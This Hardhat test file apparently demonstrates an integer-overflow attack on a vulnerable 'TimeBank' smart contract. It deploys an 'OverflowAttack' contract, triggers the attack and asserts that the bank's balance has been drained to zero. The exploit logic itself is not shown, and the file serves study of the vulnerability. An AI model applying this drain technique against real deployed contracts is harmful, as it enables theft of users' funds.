const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Overflow Attack", function () {
  let timebank;
  let overflowAttack;
  let deployer;
  let attacker;

  before(async function () {
    [attacker] = await ethers.getSigners();

    // Deploy the TimeBank contract
    const TimeBank = await ethers.getContractFactory("TimeBank");
    timebank = await TimeBank.deploy();
    await timebank.waitForDeployment();

    // Deploy the OverflowAttack contract
    const OverflowAttack = await ethers.getContractFactory("OverflowAttack");
    overflowAttack = await OverflowAttack.deploy(timebank.getAddress());
    await overflowAttack.waitForDeployment();
  });

  it("should allow overflow attack to drain funds from the bank", async function () {
    // Deployer deposits 10 ethers to the bank
    // await timebank.connect(deployer).deposit({ value: ethers.parseEther("10") });
    await timebank.connect(attacker).deposit({ value: ethers.parseEther("10") });

    // Check initial balance of bank and attacker
    let bankBalance = await timebank.getBalance();
    let attackerInitialBalance = await await ethers.provider.getBalance(attacker.getAddress());
    console.log("Bank balance before attack:", ethers.formatEther(bankBalance));
    console.log("Attacker balance before attack:", ethers.formatEther(attackerInitialBalance));
    console.log("-------------------------------")

    // Attacker performs the attack
    await overflowAttack.connect(attacker).attack({ value: ethers.parseEther("1") });

    // Check final balance of bank and attacker
    bankBalance = await timebank.getBalance();
    let attackerFinalBalance = await await ethers.provider.getBalance(attacker.getAddress());
    console.log("Bank balance after attack:", ethers.formatEther(bankBalance));
    console.log("Attacker balance after attack:", ethers.formatEther(attackerFinalBalance));
    
    // Verify that the bank's balance has been drained
    expect(bankBalance).to.equal(0);
    expect(attackerFinalBalance).to.be.above(attackerInitialBalance);
  });
});
